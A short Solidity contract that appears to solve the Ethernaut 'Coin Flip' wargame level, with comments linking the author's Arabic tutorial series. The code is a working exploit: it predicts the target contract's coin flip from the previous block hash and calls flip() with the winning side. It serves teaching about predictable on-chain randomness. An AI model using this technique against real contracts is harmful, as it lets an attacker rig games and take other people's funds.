// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }
// I'm writing a series of article in Arabic to explain ethernaut hacks 
// this was my article about this one https://medium.com/@emanherawy/ethernaut-in-arabic-level-3-coin-flip-395e0b87bcfb 
    function hackContract() external {
        // Code me!
      uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    CoinFlip(contractAddress).flip(side);

    }




 
}
